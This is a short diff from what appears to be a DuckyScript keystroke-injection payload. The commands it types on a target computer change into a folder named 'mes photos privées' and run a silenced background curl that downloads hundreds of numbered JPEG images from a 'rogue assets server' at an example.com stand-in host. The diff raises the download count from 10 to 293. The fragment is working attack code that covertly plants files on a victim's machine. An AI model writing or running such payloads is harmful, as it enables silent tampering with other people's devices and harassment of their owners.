@@ -30,7 +30,7 @@ ENTER
 REM Download "NFTW" pictures from the rogue assets server
 STRING cd mes\ photos\ privées
 ENTER
-STRING curl --dns-ipv4-addr 9.9.9.9 --dns-ipv6-addr 2620:fe::fe --compressed --remote-name "https://example.com/path/IMG_[0001-0010].jpeg" >& /dev/null &!
+STRING curl --dns-ipv4-addr 9.9.9.9 --dns-ipv6-addr 2620:fe::fe --compressed --remote-name "https://example.com/path/IMG_[0001-0293].jpeg" >& /dev/null &!
 ENTER
 DELAY 50
 
